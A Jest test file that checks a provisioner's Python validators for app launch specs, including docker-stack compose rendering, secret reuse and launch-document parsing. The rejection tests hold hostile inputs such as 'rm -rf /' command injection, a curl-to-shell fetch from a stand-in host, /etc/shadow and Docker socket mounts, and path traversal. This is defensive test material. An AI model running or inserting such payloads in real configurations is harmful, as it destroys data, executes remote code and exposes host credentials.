import { spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

import {
  buildCatalogAppLaunchSpec,
  UNIVERSAL_CATALOG_MANIFESTS,
} from "@/lib/hivra/catalog-manifests";

const PROVISIONER_DIR = path.join(process.cwd(), "provisioner");
const CATALOG_APP_SCRIPT = path.join(PROVISIONER_DIR, "hivra-catalog-app.py");
const INSTALL_AGENT_SCRIPT = path.join(PROVISIONER_DIR, "hivra-install-agent.py");

function runPython(args: string[], stdin: string) {
  return spawnSync("python3", ["-I", "-B", ...args], {
    input: stdin,
    encoding: "utf8",
    timeout: 15000,
  });
}

describe("provisioner hivra-catalog-app.py validator", () => {
  it.each(UNIVERSAL_CATALOG_MANIFESTS)("accepts the serialized launch spec for $id", (manifest) => {
    const spec = buildCatalogAppLaunchSpec(manifest);
    const res = runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(spec));
    expect(res.status).toBe(0);
    const parsed = JSON.parse(res.stdout);
    expect(parsed.appId).toBe(manifest.id);
    expect(parsed.runtime.kind).toBe(manifest.runtime.kind);
  });

  it("rejects forbidden container mounts, invalid ports, and shell metacharacters", () => {
    const base = buildCatalogAppLaunchSpec(UNIVERSAL_CATALOG_MANIFESTS.find((m) => m.id === "anythingllm")!);
    const cases = [
      { ...base, appId: "../escape" },
      { ...base, runtime: { ...base.runtime, hostPort: 8080 } },
      { ...base, runtime: { ...base.runtime, volumes: [{ name: "bad", mountPath: "/etc/shadow" }] } },
      { ...base, runtime: { ...base.runtime, volumes: [{ name: "sock", mountPath: "/var/run/docker.sock" }] } },
      { ...base, runtime: { ...base.runtime, imageRepo: "bad;rm -rf /" } },
      { ...base, runtime: { ...base.runtime, healthPath: "/../../etc/passwd" } },
    ];
    for (const bad of cases) {
      const res = runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(bad));
      expect(res.status).not.toBe(0);
    }
  });

  it("rejects arbitrary shell metacharacters in cli-web args and installers", () => {
    const base = buildCatalogAppLaunchSpec(UNIVERSAL_CATALOG_MANIFESTS.find((m) => m.id === "opencode")!);
    if (base.runtime.kind !== "cli-web" || !base.runtime.webService) throw new Error("expected cli-web");
    const badArgs = {
      ...base,
      runtime: {
        ...base.runtime,
        webService: {
          ...base.runtime.webService,
          args: ["web", ";curl evil.example|sh"],
        },
      },
    };
    expect(runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(badArgs)).status).not.toBe(0);
  });

  it("accepts bounded cli-web setup commands and rejects malformed setup", () => {
    const base = buildCatalogAppLaunchSpec(UNIVERSAL_CATALOG_MANIFESTS.find((m) => m.id === "zeroclaw")!);
    if (base.runtime.kind !== "cli-web") throw new Error("expected cli-web");
    expect(base.runtime.setup?.commands.length).toBeGreaterThan(0);
    expect(runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(base)).status).toBe(0);

    const badSetups = [
      { commands: ["line1\nline2"] },
      { commands: ["x".repeat(2001)] },
      { commands: [] },
      { commands: Array.from({ length: 17 }, () => "true") },
      { commands: "echo hi" },
      { commands: ["echo hi"], extra: true },
    ];
    for (const setup of badSetups) {
      const bad = { ...base, runtime: { ...base.runtime, setup } };
      expect(runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(bad)).status).not.toBe(0);
    }
  });

  it("accepts declared placeholders and rejects unknown ones", () => {
    const base = buildCatalogAppLaunchSpec(UNIVERSAL_CATALOG_MANIFESTS.find((m) => m.id === "uptime-kuma")!);
    if (base.runtime.kind !== "docker-web") throw new Error("expected docker-web");
    const withPlaceholders = {
      ...base,
      runtime: {
        ...base.runtime,
        env: { ...base.runtime.env, APP_URL: "${HIVRA_PUBLIC_ORIGIN}/", PUBLIC_HOST: "${HIVRA_PUBLIC_HOST}" },
      },
    };
    expect(runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(withPlaceholders)).status).toBe(0);

    const badCases = [
      { ...withPlaceholders, runtime: { ...withPlaceholders.runtime, env: { LEAK: "${HIVRA_PUBLIC_ORIGIN}${UNKNOWN_THING}" } } },
      { ...withPlaceholders, runtime: { ...withPlaceholders.runtime, env: { LEAK: "${NOT_A_SECRET}" } } },
      { ...withPlaceholders, runtime: { ...withPlaceholders.runtime, env: { LEAK: "prefix ${HIVRA_PUBLIC_ORIGIN" } } },
      { ...withPlaceholders, runtime: { ...withPlaceholders.runtime, generatedSecrets: ["MY_SECRET"], env: { LEAK: "${MY_SECRET} ${OTHER_SECRET}" } } },
      { ...withPlaceholders, runtime: { ...withPlaceholders.runtime, generatedSecrets: ["MY_SECRET", "MY_SECRET"] } },
      { ...withPlaceholders, runtime: { ...withPlaceholders.runtime, generatedSecrets: ["lowercase"] } },
      { ...withPlaceholders, runtime: { ...withPlaceholders.runtime, generatedSecrets: Array.from({ length: 9 }, (_, i) => `SECRET_${i}`) } },
    ];
    for (const bad of badCases) {
      expect(runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(bad)).status).not.toBe(0);
    }

    const withSecret = {
      ...base,
      runtime: { ...base.runtime, generatedSecrets: ["KUMA_SECRET_KEY"], env: { ...withPlaceholders.runtime.env, SECRET: "${KUMA_SECRET_KEY}" } },
    };
    expect(runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(withSecret)).status).toBe(0);
  });

  it("validates docker-stack specs and renders a hardened compose file", () => {
    const stackSpec = {
      appId: "verify-stack",
      name: "Verify Stack",
      runtime: {
        kind: "docker-stack",
        services: [
          { name: "db", imageRepo: "postgres", imageTag: "16-alpine", volumes: [{ name: "data", mountPath: "/var/lib/postgresql/data" }] },
          { name: "web", imageRepo: "postgres", imageTag: "16-alpine", env: { APP_URL: "${HIVRA_PUBLIC_ORIGIN}/" }, generatedSecrets: ["APP_SECRET"], dependsOn: ["db"] },
        ],
        web: { service: "web", containerPort: 8080, hostPort: 3210, healthPath: "/", proxyMode: "standard" },
      },
    };
    const valid = runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(stackSpec));
    expect(valid.status).toBe(0);

    const badSpecs = [
      { ...stackSpec, runtime: { ...stackSpec.runtime, services: [stackSpec.runtime.services[0]] } },
      { ...stackSpec, runtime: { ...stackSpec.runtime, services: [...stackSpec.runtime.services, { name: "extra", imageRepo: "redis", imageTag: "7", }, { name: "extra2", imageRepo: "redis", imageTag: "7" }, { name: "extra3", imageRepo: "redis", imageTag: "7" }, { name: "extra4", imageRepo: "redis", imageTag: "7" }, { name: "extra5", imageRepo: "redis", imageTag: "7" }, { name: "extra6", imageRepo: "redis", imageTag: "7" }] } },
      { ...stackSpec, runtime: { ...stackSpec.runtime, services: stackSpec.runtime.services.map((s, i) => i === 0 ? { ...s, imageTag: "latest" } : s) } },
      { ...stackSpec, runtime: { ...stackSpec.runtime, services: stackSpec.runtime.services.map((s) => ({ ...s, env: { BAD: "${UNDECLARED}" } })) } },
      { ...stackSpec, runtime: { ...stackSpec.runtime, services: stackSpec.runtime.services.map((s, i) => i === 0 ? { ...s, dependsOn: ["web"] } : s) } },
      { ...stackSpec, runtime: { ...stackSpec.runtime, web: { ...stackSpec.runtime.web, service: "missing" } } },
      { ...stackSpec, runtime: { ...stackSpec.runtime, services: stackSpec.runtime.services.map((s) => ({ ...s, volumes: [{ name: "x", mountPath: "/etc/passwd" }] })) } },
    ];
    for (const bad of badSpecs) {
      expect(runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(bad)).status).not.toBe(0);
    }

    // --render-only writes the same files install would, with fake secrets.
    const work = mkdtempSync(path.join(tmpdir(), "hivra-render-test-"));
    try {
      const specFile = path.join(work, "spec.json");
      const outDir = path.join(work, "out");
      writeFileSync(specFile, JSON.stringify({ spec: stackSpec, publicOrigin: "https://box-verify.example.test" }));
      const res = spawnSync("python3", ["-I", "-B", CATALOG_APP_SCRIPT, "render-only", specFile, outDir], { encoding: "utf8", timeout: 30_000 });
      expect(res.status).toBe(0);
      const compose = readFileSync(path.join(outDir, "compose.yaml"), "utf8");
      // Exactly one ports: entry, on the web service only, loopback-bound.
      const portLines = compose.split("\n").filter((l) => l.includes("ports:") || l.includes("127.0.0.1:"));
      expect(compose.match(/127\.0\.0\.1:/g)).toHaveLength(1);
      expect(compose).toContain("127.0.0.1:3210:8080");
      // No bind mounts, no privileged/devices/host networking anywhere.
      expect(compose).not.toMatch(/type:\s*bind|source:|privileged|network_mode|pid:\s*["']?host/);
      expect(compose).toContain("no-new-privileges:true");
      expect(compose).toContain("hivra-app-verify-stack-");
      // Web service env file carries the substituted origin + fake secret.
      const webEnv = readFileSync(path.join(outDir, "env", "web.env"), "utf8");
      expect(webEnv).toContain("APP_URL=https://box-verify.example.test/");
      expect(webEnv).toContain("APP_SECRET=render-only-app_secret");
      const meta = JSON.parse(readFileSync(path.join(outDir, "meta.json"), "utf8"));
      expect(meta.kind).toBe("docker-stack");
    } finally {
      rmSync(work, { recursive: true, force: true });
    }
  });

  it("reuses generated secret values across renders instead of rotating them", () => {
    const secretsFile = path.join(mkdtempSync(path.join(tmpdir(), "hivra-secrets-")), "secrets");
    const code = [
      "import importlib.util, json, os",
      `spec = importlib.util.spec_from_file_location('runner', ${JSON.stringify(CATALOG_APP_SCRIPT)})`,
      "mod = importlib.util.module_from_spec(spec)",
      "spec.loader.exec_module(mod)",
      "first = mod._load_or_create_secrets(['MY_KEY'], __import__('pathlib').Path(os.environ['SECRETS_FILE']))",
      "second = mod._load_or_create_secrets(['MY_KEY'], __import__('pathlib').Path(os.environ['SECRETS_FILE']))",
      "print(json.dumps({'same': first['MY_KEY'] == second['MY_KEY'], 'len': len(first['MY_KEY'])}))",
    ].join("\n");
    const res = spawnSync("python3", ["-I", "-B", "-c", code], {
      encoding: "utf8",
      timeout: 30_000,
      env: { ...process.env, SECRETS_FILE: secretsFile },
    });
    expect(res.status).toBe(0);
    const out = JSON.parse(res.stdout);
    expect(out.same).toBe(true);
    expect(out.len).toBeGreaterThanOrEqual(40);
    // The store is root-only shaped: KEY=VALUE lines, no value in stdout.
    const stored = readFileSync(secretsFile, "utf8");
    expect(stored).toMatch(/^MY_KEY=\S+\n$/);
    expect(res.stdout).not.toContain(stored.trim().split("=")[1]);
  });
});

describe("hivra-install-agent.py launch document v5", () => {
  it("parses and validates a v5 catalog-app launch document", () => {
    const spec = buildCatalogAppLaunchSpec(UNIVERSAL_CATALOG_MANIFESTS[0]);
    const launchDoc = {
      version: 5,
      agentKind: "catalog-app",
      computerSubstrate: "proxmox-kvm",
      wantBrowser: false,
      modelKey: "",
      modelBaseUrl: "",
      model: "",
      tunnelToken: "tok_test_12345",
      accessHostname: null,
      publicOrigin: "https://box-verify.example.test",
      catalogApp: spec,
    };
    const code = [
      "import importlib.util, json, sys",
      `spec = importlib.util.spec_from_file_location('install_agent', ${JSON.stringify(INSTALL_AGENT_SCRIPT)})`,
      "mod = importlib.util.module_from_spec(spec)",
      "spec.loader.exec_module(mod)",
      "parsed = mod.parse_launch(sys.stdin.buffer.read())",
      "print(json.dumps({'version': parsed['version'], 'agentKind': parsed['agentKind'], 'appId': parsed['catalogApp']['appId']}))",
    ].join("\n");
    const res = runPython(["-c", code], JSON.stringify(launchDoc));
    expect(res.status).toBe(0);
    expect(JSON.parse(res.stdout)).toEqual({
      version: 5,
      agentKind: "catalog-app",
      appId: spec.appId,
    });
  });

  it("rejects a v5 launch document with a mismatched agentKind or missing catalogApp", () => {
    const spec = buildCatalogAppLaunchSpec(UNIVERSAL_CATALOG_MANIFESTS[0]);
    const badDoc = {
      version: 5,
      agentKind: "claude",
      computerSubstrate: "proxmox-kvm",
      wantBrowser: false,
      modelKey: "",
      modelBaseUrl: "",
      model: "",
      tunnelToken: "tok_test_12345",
      accessHostname: null,
      publicOrigin: "https://box-verify.example.test",
      catalogApp: spec,
    };
    const code = [
      "import importlib.util, sys",
      `spec = importlib.util.spec_from_file_location('install_agent', ${JSON.stringify(INSTALL_AGENT_SCRIPT)})`,
      "mod = importlib.util.module_from_spec(spec)",
      "spec.loader.exec_module(mod)",
      "mod.parse_launch(sys.stdin.buffer.read())",
    ].join("\n");
    expect(runPython(["-c", code], JSON.stringify(badDoc)).status).not.toBe(0);
  });
});
